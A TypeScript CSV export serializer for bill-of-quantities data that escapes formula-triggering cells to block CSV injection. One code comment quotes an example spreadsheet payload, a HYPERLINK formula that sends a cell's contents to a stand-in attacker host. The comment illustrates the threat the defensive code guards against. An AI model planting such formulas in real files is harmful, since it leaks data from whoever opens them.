// BOQ CSV export serializer — Phase 4 (2026-07-05).
// Produces a flat one-row-per-line-item CSV (RFC 4180) with category context + carbon fields.
// Column set (PO decision 2026-07-05): full 12 columns including the nullable carbon fields.

import type { BoqVersionRow, BoqCategoryRow, BoqItemRow } from './boq.repository';

const COLUMNS = [
  'version_number',
  'category_code',
  'category_name',
  'item_code',
  'description',
  'unit',
  'quantity',
  'unit_cost',
  'estimated_total',
  'currency_code',
  'carbon_factor_kg_co2e',
  'carbon_total_kg_co2e',
] as const;

// Leading characters that make Excel / LibreOffice / Google Sheets treat a cell as a FORMULA rather
// than text (CWE-1236, CSV injection). `description`, `item_code`, `unit` and the category columns are
// free text a tenant user types through the BOQ API, and this file is served as a downloadable
// attachment — so a row like `=HYPERLINK("http://attacker/?d="&A1,"Open")` planted by one user runs in
// the spreadsheet of whoever opens the export. RFC 4180 quoting does NOT prevent this: the spreadsheet
// strips the quotes and evaluates what is inside.
const FORMULA_TRIGGERS = /^[=@\t\r]/;
// `+` and `-` are also formula triggers, but they legitimately start a number (a negative unit_cost,
// a signed carbon factor). Escaping those would turn every negative figure into text and break the
// export as a data file, so they are escaped only when the value is not a plain number.
const SIGN_TRIGGERS = /^[+-]/;

function isPlainNumber(s: string): boolean {
  return s !== '' && Number.isFinite(Number(s));
}

/** True when a spreadsheet would evaluate this cell as a formula instead of showing it as text. */
function looksLikeFormula(s: string): boolean {
  if (FORMULA_TRIGGERS.test(s)) return true;
  return SIGN_TRIGGERS.test(s) && !isPlainNumber(s);
}

// RFC 4180: wrap a field in double quotes when it contains a comma, double-quote, CR or LF;
// escape embedded double-quotes by doubling them. null/undefined → empty field.
//
// Formula-triggering values additionally get a leading apostrophe — the spreadsheet convention for
// "treat the rest of this cell as literal text" — and are always quoted so the apostrophe cannot be
// mistaken for a delimiter. The apostrophe is visible on re-import, which is the accepted trade-off:
// a readable stray quote beats executing a stranger's formula.
function escapeCsv(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (looksLikeFormula(s)) {
    return `"'${s.replace(/"/g, '""')}"`;
  }
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export function toBoqCsv(
  version: BoqVersionRow,
  categories: BoqCategoryRow[],
  items: BoqItemRow[],
): string {
  const categoryById = new Map(categories.map((c) => [c.category_id, c]));

  const lines: string[] = [COLUMNS.join(',')];

  for (const item of items) {
    const category = categoryById.get(item.category_id);
    const row = [
      version.version_number,
      category?.category_code ?? null,
      category?.category_name ?? null,
      item.item_code,
      item.description,
      item.unit,
      item.quantity,
      item.unit_cost,
      item.estimated_total,
      item.currency_code,
      item.carbon_factor_kg_co2e,
      item.carbon_total_kg_co2e,
    ];
    lines.push(row.map(escapeCsv).join(','));
  }

  // CRLF line terminator per RFC 4180.
  return lines.join('\r\n');
}
